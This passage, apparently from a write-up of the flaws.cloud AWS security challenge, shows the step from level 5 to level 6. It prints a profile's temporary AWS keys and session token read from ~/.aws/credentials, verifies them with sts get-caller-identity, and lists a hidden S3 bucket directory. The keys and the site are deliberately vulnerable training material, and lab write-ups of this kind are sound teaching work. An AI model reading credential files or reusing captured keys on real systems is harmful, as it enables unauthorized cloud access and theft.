└──╼ $tail -n 4 ~/.aws/credentials
[level5]
AWS_ACCESS_KEY_ID=ASIA6GG7PSQG3HVVD76 Y
AWS_SECRET_ACCESS_KEY=KEbQ8hY4gv5kqUxhJ43PbMvSTzMsX/4LaYThMQR 1
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjECUaCXVzLXdlc3QtMiJIMEYCIQDcPLruojywlrWbpzhbKwQy+THMF309OcJvcnERQNav6QIhAKqWln4+7HBI5mkIOMOsL8R+Yb1MHjVc73Wjv65aynJ8KrsFCK7//////////wEQBBoMOTc1NDI2MjYyMDI5Igx/MsX54m63o7gEISYqjwX636l2Jk0pVvJBZEU0qNTCtrw+CxE8ldm3dNP6Bm4lS89NGYCcLvlneeqNsGxraWtpoF/lNQEy1eJ1r91GCJAxYJlRNfd+F69g/R1RTweA4UooiSCERZgGlk8xcwzGyIH+wst4u0G7vJNpy0IDURy8dnnNuhn11/cxDUCcTB06fvYiRXDCeHxllAWzRmtJpJuhDETVvumgzcaSfBcoCZlIUi1npWRNE/9aX2C0JrvfnhbyLJDehUicH4sW2qb/phqNimh2juhpxbYBIkBCAXxrxFVnm0nE6/w7tds5Dn2ZAOcBXu0nhulBjyBHJINprkqVpyo91bZi4r7OaxUYRBNnWwdfpcUTLlHaNLnXaKgegTwJ7fnOdMEDHCFb8BCybBRAc7CiEiYT6RDD0tGE5c/RNy0p4jeODsKDe0hFSZi0C+ls+y/f3X+QmGWO1BFsoIkjzmCjdvdmZ/R2xAWzJPZnGM8D4fVxTJoD6zqj2g6W778n28hgoJucIr5Zboe4P9h9mA7IQ4PperDwKoszyCZU5vQs6Pnlf7Xp4FCDO/F/QpWu+BWJ1f6YmzBSVP9c0kX5jEiDTwOx/BZ2mNzaXfELhGTR/9kZJ/nLcnopPzpthH3Awu35aNFvAulGUM4uNb58aMyEs4qxohxGXn5Ahw6XIw9EoYqCNvQ8tsQ9P01MzcYTqwdv5/OGC3hGWNF27NKO0ZooAdr7+PqzhHN3OAcMcJfQz/oITPoucOrph1S5hdlOBKiE3np5b3sEhN8ShcupWpcaacNYCHjaax4BorauCw5qEg2wTLSefVLWbjvDzDN1c0XxeG8HZcHtMSgEWpgR+lUK7f43mwaUWltIM7ZXteB5Ffbqdq8LKS7UK7QoMJPy/bIGOrABatVLfDzRUkZLLBSHlmC/X28w+JZHGQ4PqKcwabQQtd2/4jbiLr/yfInrVRdx0bJxrIgiOpwtR3LHMlq8VchNN2SgI57fXXZLKIwEvo8gQramRS8fSY1g7dUhkz8h97GPRQ7lFY/I5AfybSaUb1y+tsKsXP8vXp3pahf30HAjTQmFb8OCSHZHF9gCWrJwdLOf7x7Iw85uEi0vLhNHBFilKjDc1bex2pPjGOyEIeSKNdk =
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile level5
{
    "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
    "Account": "975426262029",
    "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/115a90aa-9950-4173-8d47-c54729016dde)

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5
                           PRE ddcc78ff/
2017-02-27 07:41:07        871 index.html
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ --profile level5
2017-03-03 10:06:23       2463 hint1.html
2017-03-03 10:06:23       2080 hint2.html
2020-05-23 00:12:20       2924 index.html
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/49a585a0-1356-4a64-914a-880f8515191e)

Navigate: ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e4fc3577-cf77-43da-94e3-10a740cb93de)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/72e3d17a-6bab-49fe-98ad-509f310fe9a9)


### Level 6:
Visit: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/











